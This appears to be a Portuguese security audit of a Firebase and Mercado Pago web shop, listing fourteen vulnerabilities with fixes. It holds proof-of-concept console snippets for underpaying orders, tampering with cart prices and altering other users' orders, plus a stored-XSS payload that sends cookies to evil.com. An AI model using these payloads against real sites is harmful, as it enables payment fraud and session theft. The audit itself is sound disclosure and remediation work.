# Auditoria de Segurança — O Irmãozinho

**Data**: 13/07/2026
**Escopo**: código-fonte completo (`src/`, `functions/`), `firestore.rules`, `firebase.json`, documentação e histórico do git.
**Commit auditado**: `7ae82c7` (branch `main`).
**Metodologia**: revisão manual de código, análise das regras de autorização (Firestore Rules), análise do fluxo de pagamento (cliente → Cloud Function → Mercado Pago → webhook) e varredura de segredos no repositório e no histórico do git.

> **Este documento substitui `docs/ANALISE_SEGURANCA_PAGAMENTO.md`**, que afirmava "Status Geral: SEGURO". Essa conclusão está **incorreta**. O documento antigo foi movido para `garbage/` e não deve ser usado como referência.

---

## Sumário executivo

Foram encontradas **14 vulnerabilidades**, sendo **4 críticas** exploráveis hoje por qualquer usuário com uma conta comum no site.

| Severidade | Qtd. | Resumo |
|---|---|---|
| 🔴 Crítica | 4 | Compra por qualquer valor (2 caminhos), escrita em pedidos de terceiros, XSS armazenado com escalada para admin |
| 🟠 Alta | 4 | Webhook sem assinatura, credenciais vazadas no git, sem verificação de e-mail, rules de comentários permissivas |
| 🟡 Média | 4 | Sem headers de segurança, sem App Check, vazamento de dados de fornecedores, condição de corrida no estoque |
| 🔵 Baixa | 2 | Idempotency key fixa, inflação de curtidas |

**Impacto financeiro direto**: as vulnerabilidades V-01 e V-02 permitem que qualquer usuário cadastrado compre qualquer produto por R$ 0,01. O prejuízo é limitado apenas pelo estoque.

**Impacto de dados pessoais (LGPD)**: a V-03 permite acesso e alteração de pedidos de outros usuários, que contêm **nome, e-mail, CPF e endereço completo**. Isso configura incidente de segurança com dados pessoais, sujeito a comunicação à ANPD (art. 48 da LGPD) caso ocorra em produção.

**Recomendação**: congelar o desenvolvimento de novas funcionalidades até que V-01 a V-08 estejam corrigidas. Se a aplicação já está em produção com usuários reais, tratar como incidente: rotacionar credenciais imediatamente (V-06) e corrigir V-01 a V-04 em caráter de urgência.

---

## Índice de vulnerabilidades

| ID | Severidade | Título | Arquivo |
|---|---|---|---|
| V-01 | 🔴 Crítica | Valor do pagamento definido pelo cliente | `functions/index.js` |
| V-02 | 🔴 Crítica | Pedido (preços e total) criado pelo cliente | `src/services/orderService.js` + `firestore.rules` |
| V-03 | 🔴 Crítica | Qualquer usuário autenticado pode alterar qualquer pedido | `firestore.rules` |
| V-04 | 🔴 Crítica | XSS armazenado no corpo dos artigos + criação livre de artigos | `HighlightableText.jsx` + `firestore.rules` |
| V-05 | 🟠 Alta | Webhook do Mercado Pago sem validação de assinatura | `functions/index.js` |
| V-06 | 🟠 Alta | Credenciais reais no histórico do git e na documentação | `docs/`, histórico git |
| V-07 | 🟠 Alta | Verificação de e-mail nunca é enviada nem exigida | `src/contexts/AuthContext.jsx` |
| V-08 | 🟠 Alta | Rules de comentários permitem alterar campos arbitrários e forjar identidade | `firestore.rules` |
| V-09 | 🟡 Média | Nenhum header de segurança (CSP, HSTS, etc.) | `firebase.json` / `index.html` |
| V-10 | 🟡 Média | Firebase App Check ausente | projeto |
| V-11 | 🟡 Média | Dados de fornecedores expostos a qualquer usuário logado | `firestore.rules` |
| V-12 | 🟡 Média | Condição de corrida na baixa de estoque | `functions/index.js` |
| V-13 | 🔵 Baixa | `idempotencyKey` fixa (`'abc'`) no gateway | `MercadoPagoGateway.js` |
| V-14 | 🔵 Baixa | Contadores de curtidas/comentários infláveis | `firestore.rules` |

---

## 🔴 V-01 — Valor do pagamento é definido pelo cliente

**Severidade**: Crítica · **CWE-472** (External Control of Assumed-Immutable Web Parameter)

### Onde
`functions/index.js:118` — a Cloud Function `createPaymentIntent` recebe `amount` do cliente:

```js
const { orderId, paymentMethod, amount, token, installments } = data;
// ...
if (amount <= 0) { /* única validação: ser maior que zero */ }
// ...
const paymentResult = await gateway.createPayment({ orderId, amount, /* ... */ });
```

E `functions/gateways/MercadoPagoGateway.js:63` repassa direto ao gateway:

```js
transaction_amount: Number(amount),
```

O valor **nunca é comparado** com o `finalTotal` gravado no pedido.

### Exploração
Qualquer usuário autenticado, a partir do console do navegador do próprio site:

```js
// 1. Cria um pedido normalmente pela interface (ex.: R$ 500,00) e pega o orderId
// 2. Chama a function diretamente, com outro valor:
const fn = firebase.functions().httpsCallable('createPaymentIntent');
await fn({ orderId: '<id-do-pedido>', paymentMethod: 'pix', amount: 0.01 });
```

O Mercado Pago gera um PIX de R$ 0,01. O usuário paga R$ 0,01. O webhook recebe `approved`, marca o pedido como `paid` e **dá baixa no estoque**. O pedido continua registrando `finalTotal: 500.00` — a fraude só aparece na conciliação financeira.

### Impacto
Compra de qualquer produto por R$ 0,01. Não requer ferramentas especiais nem conhecimento do backend.

### Correção
1. **Imediata**: ignorar o `amount` recebido. Ler o pedido do Firestore (a função já faz isso, em `orderRef.get()`) e usar `order.finalTotal` como valor da transação.
2. **Estrutural** (ver V-02): o cliente não deve enviar valores em nenhum ponto.

```js
const order = orderDoc.data();
// ...
const paymentResult = await gateway.createPayment({
    orderId,
    amount: order.finalTotal,   // valor do servidor, nunca do cliente
    // ...
});
```
3. Remover o parâmetro `amount` de `src/services/paymentService.js` (funções `createPixPaymentIntent`, `createBoletoPaymentIntent`, `createCardPaymentIntent`).

---

## 🔴 V-02 — Pedido inteiro (itens, preços, total) é montado pelo cliente

**Severidade**: Crítica · **CWE-602** (Client-Side Enforcement of Server-Side Security)

### Onde
`src/services/orderService.js:80-89` monta o pedido com os preços vindos do carrinho, que por sua vez vem do **`localStorage`** (`src/contexts/CartContext.jsx:18`):

```js
price: item.price,              // Preço no momento da compra
subtotal: item.price * item.quantity,
// ...
subtotal: orderData.subtotal || 0,
finalTotal: orderData.finalTotal || 0,
```

O comentário na linha 50 diz *"Subtotal (validado no servidor)"* — **isso é falso**, não existe validação no servidor.

E `firestore.rules` (`isValidOrder`, linha ~213) aceita qualquer número:

```
data.finalTotal is number && data.finalTotal >= 0
```

### Exploração
Basta editar o `localStorage` antes do checkout:

```js
localStorage.setItem('cart', JSON.stringify([
  { id: 'produto-caro', name: 'Produto', price: 0.01, quantity: 1 }
]));
```

O pedido é gravado no Firestore com `finalTotal: 0.01`. Mesmo depois de corrigir a V-01 (que passa a usar `order.finalTotal`), **o total do pedido continua sendo escolhido pelo atacante**. Corrigir a V-01 sem corrigir a V-02 não resolve o problema.

### Impacto
Idêntico ao da V-01, por outro caminho. As duas precisam ser corrigidas juntas.

### Correção
Mover a criação do pedido para o servidor. Nova Cloud Function `createOrder`:

- **Entrada**: `items: [{ productId, quantity }]`, dados do cliente e endereço. **Nenhum preço.**
- **Processo**: busca cada produto na coleção `products`, valida que está `active` e com estoque, calcula `subtotal = Σ(preço_do_banco × quantidade)`, calcula frete (servidor), grava o pedido.
- **Saída**: `orderId`.
- **Rules**: `match /orders/{orderId} { allow create: if false; }` — pedidos passam a ser criados **apenas** pelo Admin SDK, que não passa pelas rules.

---

## 🔴 V-03 — Qualquer usuário autenticado pode alterar qualquer pedido

**Severidade**: Crítica · **CWE-639** (Authorization Bypass Through User-Controlled Key)

### Onde
`firestore.rules:262-272` — a terceira cláusula do `allow update` de `/orders/{orderId}`:

```
allow update: if isAdmin() ||
               (isAuthenticated() && /* dono cancelando o próprio pedido */ ) ||
               // Permitir atualizações automáticas do sistema (webhooks)
               (isAuthenticated() &&
                request.resource.data.updatedAt == request.time);   // ⚠️
```

A última condição concede escrita a **qualquer usuário autenticado**, sobre **qualquer pedido**, com a única exigência de que o campo `updatedAt` seja o timestamp do servidor.

### Por que a cláusula existe (e por que é inútil)
O comentário diz que serve para os webhooks. Isso está errado: as Cloud Functions usam o **Firebase Admin SDK**, que **ignora completamente as Security Rules**. A cláusula não é necessária para o webhook funcionar — ela só abre a brecha.

### Exploração
```js
// Qualquer usuário logado, sobre o pedido de QUALQUER pessoa:
await firebase.firestore().doc('orders/<id-de-outra-pessoa>').update({
  orderStatus: 'paid',
  'payment.status': 'approved',
  updatedAt: firebase.firestore.FieldValue.serverTimestamp()
});
```

Também permite marcar o **próprio** pedido como pago sem pagar nada.

Nota: para *ler* pedidos de terceiros o `allow read` ainda protege (só dono e admin). Mas a escrita permite corromper pedidos alheios (cancelar, alterar endereço de entrega, alterar status).

### Impacto
- Pagamento burlado (pedido vira `paid` sem transação).
- Adulteração de pedidos de outros clientes (inclusive redirecionar entrega alterando `shippingAddress`).
- Integridade de todos os dados de pedidos comprometida.

### Correção
Remover a terceira cláusula por inteiro. O `allow update` fica:

```
allow update: if isAdmin() ||
               (isAuthenticated() &&
                resource.data.userId == request.auth.uid &&
                canCancelOrder(resource.data) &&
                request.resource.data.orderStatus == 'cancelled' &&
                request.resource.data.diff(resource.data).affectedKeys()
                  .hasOnly(['orderStatus', 'updatedAt', 'statusHistory']));
```

---

## 🔴 V-04 — XSS armazenado no corpo dos artigos, com escalada para admin

**Severidade**: Crítica · **CWE-79** (Stored Cross-Site Scripting)

### Onde
Dois problemas que se combinam.

**a) Renderização sem sanitização** — `src/components/features/textToSpeech/HighlightableText.jsx:116`:

```jsx
<p dangerouslySetInnerHTML={{ __html: paragraph.trim() }} />
```

O conteúdo vem direto de `article.body` (Firestore). O projeto **não tem DOMPurify nem qualquer sanitizador** instalado (confirmado no `package.json`). O mesmo padrão aparece em `src/lib/stringUtils.js:4` e `src/pages/admin/ArticleEditor.jsx`.

**b) Qualquer usuário autenticado pode criar artigos** — `firestore.rules:138-142`:

```
// TEMPORÁRIO: Qualquer usuário autenticado pode criar artigos para debug
allow create: if isAuthenticated() && isValidArticle(request.resource.data) && ...
```

O `isValidArticle` valida tamanho e categoria, mas **não valida o conteúdo do HTML**.

### Exploração
1. O atacante cria uma conta comum no site.
2. Grava um documento em `content` (via SDK, direto do console) com:
   ```js
   body: '<img src=x onerror="fetch(\'https://evil.com/?c=\'+document.cookie)">'
   ```
   Ou algo mais eficaz: um script que usa a sessão da vítima para executar ações no Firestore.
3. Todo visitante que abrir o artigo executa o código. **Inclusive o administrador** — e o token do admin no navegador dele tem o custom claim `role: 'admin'`, permitindo ao script criar produtos, apagar conteúdo, ler todos os pedidos (com CPF e endereço de todos os clientes) e criar outros admins onde as rules permitirem.

### Impacto
Comprometimento total da aplicação por escalada de privilégio via sessão do admin. Vazamento de dados pessoais de todos os clientes (incidente LGPD). Desfiguração do site. Distribuição de malware aos leitores.

### Correção
1. **Restaurar a restrição nas rules** — só admin cria conteúdo:
   ```
   allow create: if isAdmin() && isValidArticle(request.resource.data) && ...;
   ```
2. **Sanitizar na renderização** (a defesa que realmente importa — mesmo com o admin como único autor, um admin comprometido ou um erro de copy-paste de HTML externo reintroduz o problema):
   ```bash
   npm i dompurify
   ```
   ```jsx
   import DOMPurify from 'dompurify';

   const clean = DOMPurify.sanitize(paragraph, {
     ALLOWED_TAGS: ['p','br','strong','em','u','h2','h3','blockquote','ul','ol','li','a','img'],
     ALLOWED_ATTR: ['href','src','alt','title','target','rel']
   });
   ```
   Aplicar em **todos** os pontos: `HighlightableText.jsx`, `stringUtils.js`, `ArticleEditor.jsx`.
3. **Sanitizar também na escrita** (`ArticleEditor.jsx`), como defesa em profundidade.
4. Uma CSP restritiva (V-09) reduz drasticamente o dano de um XSS residual.

---

## 🟠 V-05 — Webhook do Mercado Pago sem validação de assinatura

**Severidade**: Alta · **CWE-345** (Insufficient Verification of Data Authenticity)

### Onde
`functions/index.js:369` — `handlePaymentWebhook` é um endpoint HTTP **público** que aceita qualquer POST, sem autenticação:

```js
exports.handlePaymentWebhook = functions.runWith({...}).https.onRequest(async (req, res) => {
    // ...
    const { type, data } = req.body;   // nenhuma validação de origem
```

### Mitigação parcial existente
O `MercadoPagoGateway.processWebhook` **consulta o pagamento na API do MP** pelo ID recebido, em vez de confiar no status do corpo da requisição. Isso impede o ataque mais óbvio (enviar `status: approved` falso). É uma boa decisão de design e evita que a falha seja crítica.

### O que ainda é possível
- **Enumeração/replay**: forçar o processamento de IDs de pagamento arbitrários, incluindo reprocessar eventos antigos.
- **Abuso de custo (DoS financeiro)**: o endpoint é público e faz uma chamada externa à API do MP a cada requisição. Sem `maxInstances` configurado, um atacante gera custo ilimitado de Functions no plano Blaze.
- Combinado com a falta de idempotência (V-12 relacionada), o reenvio do mesmo evento duplica entradas em `statusHistory` e pode disparar a baixa de estoque mais de uma vez.

### Correção
1. Validar o header `x-signature` do MP (HMAC-SHA256 sobre `id`, `x-request-id` e `ts`, usando o *secret* do webhook do painel do Mercado Pago). Rejeitar com **401** se não conferir:
   ```js
   const secret = process.env.MERCADOPAGO_WEBHOOK_SECRET; // Functions secret
   // manifest: `id:${dataId};request-id:${xRequestId};ts:${ts};`
   const expected = crypto.createHmac('sha256', secret).update(manifest).digest('hex');
   if (!crypto.timingSafeEqual(Buffer.from(expected), Buffer.from(receivedHash))) {
       return res.status(401).send('Invalid signature');
   }
   ```
2. Definir `maxInstances` na função (proteção de custo).
3. Idempotência: registrar `x-request-id` em uma coleção `webhook_events` e ignorar eventos já processados.

---

## 🟠 V-06 — Credenciais reais versionadas no git e na documentação

**Severidade**: Alta · **CWE-798** (Use of Hard-coded Credentials)

### O que foi encontrado

| Credencial | Onde | Situação |
|---|---|---|
| **Client Secret do Mercado Pago** | `docs/CONFIGURAR_MERCADOPAGO_CLI.md` (linha 8) | **Em texto puro no arquivo atual** e no histórico |
| **Client ID do Mercado Pago** | mesmo arquivo | Em texto puro |
| **Access Token do Mercado Pago** (`APP_USR-…`) | histórico do git (commit `ee2858a`) | Removido do código atual no commit `7ae82c7`, mas **permanece no histórico** |
| Firebase Web API Key | `docs/SETUP.md:44`, `docs/VERCEL_DEPLOY.md:30` | Em texto puro (ver ressalva abaixo) |

**Ponto central**: o commit `7ae82c7` ("Ajustado segurança") substituiu os tokens por placeholders **nos arquivos**, mas `git log -S` confirma que os valores originais continuam recuperáveis no histórico. Qualquer pessoa com acesso ao repositório (que é público no GitHub, conforme `package.json`) pode recuperá-los com `git log -p`.

**Ressalva sobre a Firebase Web API Key**: ao contrário do que o nome sugere, ela **não é um segredo** — é um identificador público do projeto, exposto necessariamente no bundle do front-end. Não precisa ser rotacionada. A proteção do Firebase vem das Security Rules e do App Check (V-10), não do sigilo dessa chave. Ela é listada aqui apenas para registro.

### Impacto
O Access Token e o Client Secret do Mercado Pago dão acesso à API de pagamentos da conta: consultar transações (dados de clientes), criar pagamentos e, dependendo do escopo, movimentar valores.

### Correção — **fazer agora, nesta ordem**
1. **Rotacionar as credenciais do Mercado Pago** no painel (gerar novas, revogar as antigas). Isso é o que efetivamente resolve — remover do git *não* invalida uma credencial que já vazou. Assumir que o valor está comprometido.
2. Cadastrar as novas como secrets do Functions (`firebase functions:secrets:set MERCADOPAGO_ACCESS_TOKEN`).
3. Remover do repositório os documentos com credenciais (feito: movidos para `garbage/`).
4. **Opcional, e a decidir**: limpar o histórico com `git filter-repo` ou BFG. Isso reescreve todos os commits (muda todos os hashes) e exige `push --force`. Como o repositório é de um autor só, é viável. Mas **só faz sentido depois da rotação** — e a rotação sozinha já neutraliza o risco.
5. Ativar **push protection / secret scanning** no GitHub para impedir novos vazamentos.

---

## 🟠 V-07 — Verificação de e-mail nunca é enviada nem exigida

**Severidade**: Alta

### Onde
`src/contexts/AuthContext.jsx:32-37` — o cadastro cria o usuário e grava o perfil, mas **nunca chama `sendEmailVerification`**. A busca por `sendEmailVerification` em todo o `src/` retorna zero ocorrências. O campo `emailVerified` é apenas *lido* (linha 37) e nunca exigido em lugar nenhum — nem no cliente, nem nas rules.

> **Documentação contradiz o código**: `docs/EMAIL_VERIFICATION.md` afirma "O sistema de verificação de email **foi implementado**". Isso é falso no código atual. Cinco documentos de troubleshooting de e-mail (`EMAIL_DEBUG`, `EMAIL_NOT_ARRIVING`, `EMAIL_QUICK_FIX`, `EMAIL_TROUBLESHOOTING`, `QUICK_EMAIL_SETUP`) discutem um recurso que não existe no código. Todos foram movidos para `garbage/`.

### Impacto
- Contas criadas com e-mails de terceiros ou inexistentes.
- Spam de comentários por contas descartáveis.
- Pedidos com e-mail de contato inválido (o cliente não recebe nada).
- Sem e-mail verificado, não há base confiável para o consentimento de newsletter exigido pela LGPD.

### Correção
1. Chamar `sendEmailVerification(user)` logo após `createUserWithEmailAndPassword`.
2. Exigir `emailVerified` para comentar, curtir e finalizar compra — no cliente **e nas rules**:
   ```
   function isVerified() {
     return isAuthenticated() && request.auth.token.email_verified == true;
   }
   ```
3. Tela de "confirme seu e-mail" com opção de reenvio.
4. Ativar **proteção contra enumeração de e-mail** no Firebase Console (Authentication → Settings).

---

## 🟠 V-08 — Rules de comentários: campos arbitrários e identidade forjada

**Severidade**: Alta

### Onde
`firestore.rules:369-387` — o primeiro `allow update` de `/comments/{commentId}`:

```
allow update: if isAuthenticated() &&
                 resource.data.userId == request.auth.uid &&
                 /* ... valida só o campo content ... */
                 // 4. Tempo: 1h + 5min tolerância (DESATIVADO TEMPORARIAMENTE PARA DEBUG)
                 // (resource.data.createdAt == null || ...)
                 true;                                    // ⚠️
```

Dois problemas:
1. **Não há `affectedKeys().hasOnly(...)`**: o dono do comentário pode alterar **qualquer campo** na edição — `userName`, `articleId`, `createdAt`, ou até injetar campos novos. Só o `content` é validado.
2. **A janela de edição de 1 hora está desativada** (o código termina com um literal `true`), com o comentário "DESATIVADO TEMPORARIAMENTE PARA DEBUG".

**Problema relacionado, na criação**: `commentService.js:49` grava `userName: userData.displayName || ... || 'Usuário'`, um valor vindo do cliente, e as rules não o confrontam com o token de autenticação. Um usuário pode publicar comentários assinando como **"Administrador"** ou como outro usuário. É *spoofing* de identidade dentro do blog.

### Correção
```
allow update: if isAuthenticated() &&
                 resource.data.userId == request.auth.uid &&
                 resource.data.isDeleted == false &&
                 request.resource.data.content is string &&
                 request.resource.data.content.size() >= 3 &&
                 request.resource.data.content.size() <= 500 &&
                 request.resource.data.diff(resource.data).affectedKeys()
                   .hasOnly(['content', 'updatedAt']) &&
                 (request.time.seconds - resource.data.createdAt.seconds) <= 3900;
```
E na criação, validar a identidade contra o token:
```
request.resource.data.userName == request.auth.token.name
```
(ou remover o `userName` do documento e resolvê-lo no cliente a partir do `users/{uid}`.)

---

## 🟡 V-09 — Nenhum header de segurança HTTP

**Severidade**: Média

### Onde
`firebase.json` não define `hosting.headers`, e o `index.html` não tem nenhuma meta tag de CSP. A aplicação é servida sem **CSP, HSTS, X-Content-Type-Options, X-Frame-Options ou Referrer-Policy**.

### Impacto
- Sem **CSP**, o XSS da V-04 tem impacto máximo (exfiltração para qualquer domínio).
- Sem **HSTS**, há janela para downgrade/SSL stripping.
- Sem **X-Frame-Options/frame-ancestors**, o site pode ser embutido em iframe (clickjacking — relevante em botões de compra).

### Correção
Em `firebase.json`:
```json
"hosting": {
  "headers": [{
    "source": "**",
    "headers": [
      { "key": "Content-Security-Policy", "value": "default-src 'self'; script-src 'self' https://sdk.mercadopago.com https://www.google.com https://www.gstatic.com; style-src 'self' 'unsafe-inline'; img-src 'self' data: https:; connect-src 'self' https://*.googleapis.com https://*.firebaseio.com https://api.mercadopago.com; frame-src https://sdk.mercadopago.com; frame-ancestors 'none'; base-uri 'self'; form-action 'self'" },
      { "key": "Strict-Transport-Security", "value": "max-age=31536000; includeSubDomains; preload" },
      { "key": "X-Content-Type-Options", "value": "nosniff" },
      { "key": "X-Frame-Options", "value": "DENY" },
      { "key": "Referrer-Policy", "value": "strict-origin-when-cross-origin" },
      { "key": "Permissions-Policy", "value": "geolocation=(), camera=(), microphone=(), payment=()" }
    ]
  }]
}
```
Ajustar `script-src`/`connect-src` conforme os domínios realmente usados (Mercado Pago, Firebase). Validar em https://securityheaders.com após o deploy. Se a aplicação for implantada na Vercel (existe `docs/VERCEL_DEPLOY.md`), replicar os headers em `vercel.json`.

---

## 🟡 V-10 — Firebase App Check ausente

**Severidade**: Média

Sem App Check, o Firestore e as Cloud Functions aceitam requisições de **qualquer origem** — scripts, bots, Postman —, e não apenas do app legítimo. Foi exatamente esse o vetor usado nas provas de conceito das V-01, V-02 e V-03 (chamadas diretas ao SDK, fora da interface).

App Check não substitui as Security Rules (a autorização continua sendo delas), mas eleva muito o custo de automatizar um ataque e protege contra abuso/scraping.

**Correção**: ativar App Check com reCAPTCHA Enterprise (web), aplicando a Firestore, Functions e Auth. Rodar em modo de monitoramento por alguns dias antes de ativar o *enforcement*.

---

## 🟡 V-11 — Dados de fornecedores expostos a qualquer usuário logado

**Severidade**: Média · **CWE-200** (Exposure of Sensitive Information)

### Onde
`firestore.rules:185-208` — coleção `/suppliers`:
```
allow read: if isAuthenticated() && (resource.data.active == true || isAdmin() || resource.data.isDefault == true);
allow list: if isAuthenticated();      // ⚠️ qualquer usuário lista todos
```

Os documentos de fornecedor contêm `email`, `phone`, `orderEmail`, **`commissionRate`** e `paymentMethod`.

### Impacto
Qualquer pessoa que crie uma conta no blog consegue listar todos os fornecedores com **as taxas de comissão negociadas** e os e-mails de contato. É vazamento de informação comercial sensível (e de dados pessoais, se os fornecedores forem pessoa física).

### Correção
Restringir a leitura a admins. Se o front-end precisa de fornecedores para popular um seletor, esse seletor está numa tela de admin — logo, `allow read, list: if isAdmin();` é suficiente. Se algum dado de fornecedor precisar aparecer publicamente (ex.: "vendido por"), desnormalizar apenas o **nome** no documento do produto (já existe `supplierName`).

---

## 🟡 V-12 — Condição de corrida na baixa de estoque

**Severidade**: Média · **CWE-362** (Race Condition)

### Onde
`functions/index.js:24-87` — `reduceProductStock` faz *read-then-write* com `batch`, não com transação:

```js
const productDoc = await productRef.get();      // lê
const currentStock = product.stock || 0;
if (currentStock < item.quantity) { /* erro */ }
batch.update(productRef, { stock: admin.firestore.FieldValue.increment(-item.quantity) });  // escreve depois
await batch.commit();
```

Entre o `get()` e o `commit()`, outro webhook pode ter reduzido o mesmo estoque. A verificação `currentStock < item.quantity` usa um valor potencialmente obsoleto.

### Impacto
Venda de produto sem estoque (estoque negativo). Cenários reais: dois clientes pagando o último item simultaneamente, ou o mesmo webhook reenviado pelo MP (que acontece com frequência).

### Correção
1. Usar `db.runTransaction()`, lendo e decrementando atomicamente dentro da transação.
2. Idempotência do webhook (V-05), para o reenvio do mesmo evento não dar baixa duas vezes.
3. Melhor ainda: **reservar** o estoque na criação do pedido (`createOrder`, V-02) e liberar por função agendada se o pagamento não ocorrer em X horas.

---

## 🔵 V-13 — `idempotencyKey` fixa no gateway

**Severidade**: Baixa

`functions/gateways/MercadoPagoGateway.js:17`:
```js
options: { timeout: 5000, idempotencyKey: 'abc' }
```

A chave de idempotência é **a mesma para todas as requisições**. É exatamente o oposto do propósito do mecanismo: o MP pode tratar pagamentos legítimos e distintos como repetição de um mesmo pagamento, retornando o resultado do anterior.

**Correção**: gerar por requisição (`crypto.randomUUID()` ou `${orderId}-${paymentMethod}`) e passá-la na chamada de criação do pagamento, não no construtor do cliente.

---

## 🔵 V-14 — Contadores de curtidas e comentários infláveis

**Severidade**: Baixa

`firestore.rules:108-131` — `isValidLikesCountUpdate` e `isValidCommentsCountUpdate` permitem que **qualquer usuário autenticado** incremente ou decremente `likesCount`/`commentsCount` em ±1, sem verificar se existe um documento correspondente em `likes`/`comments`.

Um script em loop infla (ou zera) os contadores de qualquer artigo. Não há impacto de segurança grave, mas corrompe as métricas — que, segundo `docs/COMMENTS_LIKES_AND_RECOMMENDATIONS_ANALYSIS.md`, devem alimentar o sistema de recomendação.

**Correção**: mover a manutenção dos contadores para uma Cloud Function com trigger (`onDocumentCreated`/`onDocumentDeleted` em `likes` e `comments`) e proibir a escrita direta dos contadores pelo cliente. É a abordagem padrão para contadores agregados no Firestore.

---

## Plano de correção

A ordem abaixo é a mesma da **Fase 0** e da **Fase 1** do [PLANO_DE_ACAO.md](../../PLANO_DE_ACAO.md).

### Bloco 1 — Emergencial (antes de qualquer coisa)
| # | Ação | Vulnerabilidades |
|---|---|---|
| 1 | Rotacionar credenciais do Mercado Pago | V-06 |
| 2 | Remover a cláusula permissiva do `allow update` de `orders` | V-03 |
| 3 | `createPaymentIntent` passa a usar `order.finalTotal` | V-01 |
| 4 | Restaurar `allow create: if isAdmin()` em `content` | V-04 |
| 5 | DOMPurify em toda renderização de HTML | V-04 |
| 6 | Restringir `affectedKeys` e reativar janela de edição em `comments` | V-08 |
| 7 | Headers de segurança no `firebase.json` | V-09 |

**Deploy**: `firebase deploy --only firestore:rules,functions,hosting`.

### Bloco 2 — Estrutural (1–2 semanas)
| # | Ação | Vulnerabilidades |
|---|---|---|
| 8 | Cloud Function `createOrder` (preços e total no servidor) | V-02, V-12 |
| 9 | Validação de assinatura do webhook + idempotência + `maxInstances` | V-05, V-12 |
| 10 | Transação real na baixa de estoque | V-12 |
| 11 | `sendEmailVerification` + exigir `email_verified` nas rules | V-07 |
| 12 | Ativar App Check (monitorar → *enforce*) | V-10 |
| 13 | Restringir leitura de `suppliers` a admins | V-11 |
| 14 | `idempotencyKey` por requisição | V-13 |
| 15 | Contadores via trigger de Cloud Function | V-14 |

### Bloco 3 — Garantia (contínuo)
- **Testes das Security Rules** com `@firebase/rules-unit-testing` no emulador, cobrindo cada uma das V-01 a V-14 como teste de regressão. Hoje as rules são o perímetro de segurança da aplicação e **não têm um único teste** — foi o que permitiu que a V-03 passasse despercebida.
- Testes das Cloud Functions no emulador (webhook com assinatura inválida, `createOrder` com preço adulterado).
- CI que roda esses testes em todo PR e bloqueia o merge em caso de falha.
- `npm audit` no CI e revisão periódica de dependências.

---

## Como verificar as correções

Depois do Bloco 1, cada exploit abaixo deve **falhar**:

| Teste | Resultado esperado |
|---|---|
| `createPaymentIntent({ orderId, paymentMethod: 'pix', amount: 0.01 })` num pedido de R$ 500 | Pagamento gerado com o valor real do pedido (R$ 500), não R$ 0,01 |
| `update()` num pedido de outro usuário | `PERMISSION_DENIED` |
| Criar documento em `content` com conta não-admin | `PERMISSION_DENIED` |
| Artigo com `<img src=x onerror=alert(1)>` | Renderiza a imagem quebrada, **sem executar o script** |
| `update()` de comentário alterando `userName` | `PERMISSION_DENIED` |
| `curl -X POST` no webhook sem `x-signature` | `401` |
| `curl -I` na home | Retorna CSP, HSTS, X-Content-Type-Options, X-Frame-Options |

---

## Referências

- OWASP Top 10 2021: A01 (Broken Access Control) — V-01, V-02, V-03, V-11; A03 (Injection/XSS) — V-04; A05 (Security Misconfiguration) — V-09, V-10; A07 (Identification and Authentication Failures) — V-07, V-08.
- [Firebase Security Rules — boas práticas](https://firebase.google.com/docs/rules/best-practices)
- [Mercado Pago — validação de webhooks](https://www.mercadopago.com.br/developers/pt/docs/your-integrations/notifications/webhooks)
- [LGPD, art. 46 e 48](https://www.planalto.gov.br/ccivil_03/_ato2015-2018/2018/lei/l13709.htm) — medidas de segurança e comunicação de incidente.
